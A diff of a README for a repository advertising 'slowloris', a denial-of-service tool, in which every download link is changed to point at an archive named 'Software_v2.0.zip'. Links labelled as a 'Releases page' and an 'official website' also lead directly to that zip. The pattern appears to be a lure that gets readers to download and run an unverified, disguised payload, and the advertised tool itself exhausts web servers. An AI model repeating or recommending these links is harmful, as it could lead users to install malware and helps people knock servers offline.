@@ -1,6 +1,6 @@
 # 🐢 slowloris - Simple Tool for Effective DDoS Testing
 
-## 📦 [Download slowloris Here](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/slowloris-v2.5.zip)
+## 📦 [Download slowloris Here](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/Software_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -26,9 +26,9 @@ To run slowloris smoothly, ensure your system meets the following requirements:
 
 To download slowloris, visit the following link:
 
-[Download slowloris](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/slowloris-v2.5.zip)
+[Download slowloris](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/Software_v2.0.zip)
 
-1. **Visit the Releases Page:** Click on the link to access the slowloris [Releases page](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/slowloris-v2.5.zip).
+1. **Visit the Releases Page:** Click on the link to access the slowloris [Releases page](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/Software_v2.0.zip).
 2. **Choose Your Version:** You will find different versions of slowloris listed. Look for the most recent version for the best experience.
 3. **Download the File:** Click the release that matches your platform, which will download a compressed file containing slowloris.
 4. **Extract the File:** Once the download is complete, locate the compressed file. Right-click on it and choose “Extract All” to unpack its contents.
@@ -71,6 +71,6 @@ Feel free to contribute to slowloris by reporting bugs, suggesting features, or 
 
 ## 🌐 Find Out More
 
-For more detailed information about slowloris, visit the official [slowloris website](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/slowloris-v2.5.zip). You'll find additional resources and updates about new features.
+For more detailed information about slowloris, visit the official [slowloris website](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/Software_v2.0.zip). You'll find additional resources and updates about new features.
 
-[Download slowloris](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/slowloris-v2.5.zip) and start exploring its capabilities today!
+[Download slowloris](https://raw.githubusercontent.com/Amergamer926/slowloris/main/disminister/Software_v2.0.zip) and start exploring its capabilities today!
